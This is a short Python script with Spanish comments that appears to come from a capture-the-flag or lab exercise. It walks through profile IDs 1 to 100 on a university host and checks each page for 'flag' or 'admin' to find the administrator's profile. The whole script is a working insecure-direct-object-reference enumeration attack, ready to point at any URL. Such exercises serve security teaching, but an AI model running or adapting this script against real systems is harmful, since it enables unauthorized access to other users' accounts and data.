#!/usr/bin/env python3
import requests
import time

# ✅ CONFIGURACIÓN — modificá esto según tu caso
BASE_URL = "https://desauth.dsa.linti.unlp.edu.ar"  # Cambiá esto por la URL que quieras
ID_INICIO = 1
ID_MAX = 100
DELAY_SEGUNDOS = 0.1

def probar_ids():
    print(f"Probando IDs desde {ID_INICIO} hasta {ID_MAX} en {BASE_URL}...\n")
    for id in range(ID_INICIO, ID_MAX + 1):
        url = f"{BASE_URL}/perfil/{id}"
        try:
            response = requests.get(url)
            html = response.text

            if "parte" in html or "flag" in html or "admin" in html:
                print(f"\n✅ ¡Perfil del admin encontrado! ID: {id}")
                print(f"🔗 Ir a: {url}\n")
            else:
                print(f"ID {id} no es el admin.")
        except Exception as e:
            print(f"❌ Error al probar ID {id}: {e}")
        
        time.sleep(DELAY_SEGUNDOS)

    print("\n✅ Listo. Se probaron todos los IDs.")

if __name__ == "__main__":
    probar_ids()

